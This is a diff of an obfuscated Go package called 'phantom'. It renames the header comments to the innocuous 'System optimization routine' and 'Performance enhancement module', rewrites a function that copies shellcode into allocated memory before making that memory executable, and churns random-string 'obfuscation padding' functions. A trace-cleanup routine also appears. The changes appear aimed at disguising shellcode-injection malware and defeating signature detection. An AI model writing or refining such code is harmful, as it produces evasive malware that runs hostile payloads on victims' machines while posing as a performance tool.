@@ -1,11 +1,10 @@
 // OBFUSCATED
-// Windows compatibility layer
-// Memory management system
+// System optimization routine
+// Performance enhancement module
 package phantom
 
 import (
 	"crypto/rand"
-	"reflect"
 	"runtime"
 	"sync"
 	"syscall"
@@ -374,13 +373,10 @@ func createPhantomShellcode(payload func()) []byte {
 
 // writePhantomCode - Writes shellcode to allocated memory
 func writePhantomCode(addr uintptr, shellcode []byte) error {
-	// Copy shellcode using reflect SliceHeader
-	var slice []byte
-	sh := (*reflect.SliceHeader)(unsafe.Pointer(&slice))
-	sh.Data = addr
-	sh.Len = len(shellcode)
-	sh.Cap = len(shellcode)
-	copy(slice, shellcode)
+	// Copy shellcode
+	for i, b := range shellcode {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+	}
 
 	// Change memory protection to executable
 	var oldProtect uint32
@@ -560,32 +556,38 @@ func CleanupPhantomTraces() {
 	runtime.GC() // Force garbage collection
 }
 
-// Obfuscation padding
-func obf_47355() {
-	_ = 4006
-	var _ = "9tlJYmNjQ5Wlk1uaPjd3eYzDKW8WLAcVEeKEL8I05SmUExtNvq"
-}
+
 
 // Obfuscation padding
-func obf_34658() {
-	_ = 9827
-	var _ = "UCu2I1kPQgbeLGqThwn8qKdXNnRV33T4gFCFyff2fo0LmIJZhB"
+func obf_38055() {
+    _ = 5264
+    var _ = "2XDjFkdHF6RFGLyzYk3fz0IrpICuhgzPHZyLFrG7tunBZLhSlW"
 }
 
-// Obfuscation padding
-func obf_95313() {
-	_ = 429
-	var _ = "t06prenSmKv5hQsxi0dUD8mcAI9VJUdvTtnZV3GE3meaca8cpF"
-}
 
 // Obfuscation padding
-func obf_27035() {
-	_ = 1632
-	var _ = "NKjwcmArG24h0rpHCu8ZEYUocJaNZCgI7NyANt6VqVO9kcmclm"
+func obf_56061() {
+    _ = 5686
+    var _ = "Tg2TieuaG2x1JyeA8b1nPH1vBbXNH4pUWpS7evYyP4I7oLLTt2"
 }
 
+
 // Obfuscation padding
-func obf_31849() {
-	_ = 2728
-	var _ = "Kpk1vqduRArDfiPmdtgiekUfb7AI0I8CC3gRdGHDQBYo3iihi9"
+func obf_82244() {
+    _ = 3256
+    var _ = "kmuqbpg00GfoOhzd4CJ9eANXeVZfdE0iOqMhSgfWbaI3AcDNL6"
+}
+
+
+// Obfuscation padding
+func obf_41193() {
+    _ = 668
+    var _ = "BMe2e4AwSAv1qGmBgvmTl1dw6ejWPgvwr4bzG4n2YvqEs6YtAz"
+}
+
+
+// Obfuscation padding
+func obf_71414() {
+    _ = 3643
+    var _ = "B1uEG7HEOLStxaRx2j6Wb14La6JEOukTLoNzhuoqhN3yWXuQ34"
 }
